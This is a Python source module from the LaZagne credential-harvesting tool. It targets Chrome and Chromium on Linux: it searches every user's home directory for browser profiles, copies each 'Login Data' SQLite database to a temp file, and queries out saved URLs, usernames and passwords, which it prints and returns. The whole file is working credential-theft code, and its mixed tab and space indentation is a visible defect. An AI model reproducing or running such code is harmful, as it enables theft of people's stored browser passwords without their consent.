# For non-keyring storage

from lazagne.config.constant import *
from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config import homes

import sqlite3
import tempfile

import os

class Chrome(ModuleInfo):
    def __init__(self):
		options = {'command': '-C', 'action': 'store_true', 'dest': 'chrome', 'help': 'chrome'}
		ModuleInfo.__init__(self, 'chrome', 'browsers', options)

    def get_paths(self):
        for profile_dir in homes.get(dir=['.config/google-chrome', '.config/chromium']):
            try:
                subdirs = os.listdir(profile_dir)
            except:
                continue

            for subdir in subdirs:
                logins = os.path.join(profile_dir, subdir, 'Login Data')
                if os.path.isfile(logins):
                    yield logins

    def get_logins(self, path):
        try:
            conn = sqlite3.connect(path)
        except:
            return

        cursor = conn.cursor()

        try:
            cursor.execute('SELECT origin_url,username_value,password_value FROM logins')
            for url, user, password in cursor:
                print url, user, password
                yield {
                    'URL': url,
                    'Login': user,
                    'Password': password
                }
        except:
            pass

        finally:
            cursor.close()
            conn.close()

    def run(self, software_name = None):
        all_passwords = []
        for path in self.get_paths():
            with tempfile.NamedTemporaryFile() as tmp:
                with open(path) as infile:
                    tmp.write(infile.read())

                for pw in self.get_logins(tmp.name):
                    all_passwords.append(pw)

        return all_passwords
